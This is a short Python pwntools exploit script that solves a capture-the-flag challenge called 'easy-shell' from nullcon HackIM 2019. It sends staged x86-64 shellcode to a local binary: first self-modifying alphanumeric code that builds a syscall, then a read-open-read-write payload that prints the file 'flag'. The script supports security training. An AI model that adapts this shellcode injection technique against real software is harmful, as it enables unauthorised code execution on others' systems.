# This exploit is based off of: https://lordidiot.github.io/2019-02-03/nullcon-hackim-ctf-2019/#easy-shell

from pwn import *

target = process('./challenge')
#gdb.attach(target)


context.arch = "amd64"

# Here is the shellcode which will do the prep for the syscal
# Also we need to appen the 'PP' (0x5050) in fron of the 'aa' (0x6161) since we need alphanumeric characters there
sc0 = asm("""
push rsi
pop rcx
xor eax, 0x50506161
xor dword ptr [rcx + 0x30], eax
push rdi
pop rax
push rbx
pop rdx      
""")

# Append our psuedo nops to the end of the shellcode 
nop = asm("push rax; pop rax")

while len(sc0) < 0x30:
    sc0 += nop

# Here are the other two characters which will be xored to get '\x05\x0f'
sc0 += "nd"

# Send the first shellcode
target.send(sc0)

# Build the second shellcode, check the writeup for detailed explanation
sc1 = asm("""
sub rsp, 0x1000
mov rsi, rsp
xor rdi, rdi
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
mov rax, 1
syscall
""")

# We have to send 0x32 characters before our shellcode, since after the previous syscall from sc0 is done, it will continue execution 0x32 bytes after the start of our input
target.send("0"*0x32 + sc1)

# Send "flag" for the filename to read
target.send("flag\x00")

target.interactive()
